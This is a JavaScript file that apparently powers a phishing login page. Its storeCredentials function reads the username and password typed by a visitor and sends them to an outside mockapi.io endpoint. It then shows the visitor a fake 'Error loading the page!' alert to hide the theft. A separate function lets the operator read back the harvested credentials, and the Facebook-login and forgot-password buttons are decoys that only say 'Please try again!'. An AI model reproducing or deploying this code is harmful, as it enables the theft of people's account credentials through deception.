
function storeCredentials() {
    const usernameInput = document.getElementById('hero');
    const passwordInput = document.getElementById('heroine');

    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (username && password) {
        const data = { 
            user: username,
            pass: password
        };

        fetch('https://67ee2158c11d5ff4bf78703b.mockapi.io/api/hero/userData', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Stored Data:', data);
            alert('Error loading the page!');

            usernameInput.value = '';
            passwordInput.value = '';
        })
        .catch(error => {
            console.error('Error storing data:', error);
            alert('Failed to store credentials. Try again later.');
        });
    } else {
        alert('Please provide valid credentials.');
    }
}

function retrieveCredentials() {
    fetch('https://67ee2158c11d5ff4bf78703b.mockapi.io/api/hero/userData')
        .then(response => response.json())
        .then(data => {
            console.log('Retrieved Data:', data);
            alert('Check console for retrieved data.');
        })
        .catch(error => {
            console.error('Error fetching data:', error);
            alert('Failed to retrieve credentials.');
        });
}

function handleLogin() {
    storeCredentials();
}

document.querySelectorAll("#facebook-login").forEach(button => {
    button.addEventListener("click", () => {
        alert("Please try again!");
    });
});

document.querySelectorAll("#forgot-password").forEach(button => {
    button.addEventListener("click", () => {
        alert("Please try again!");
    });
});
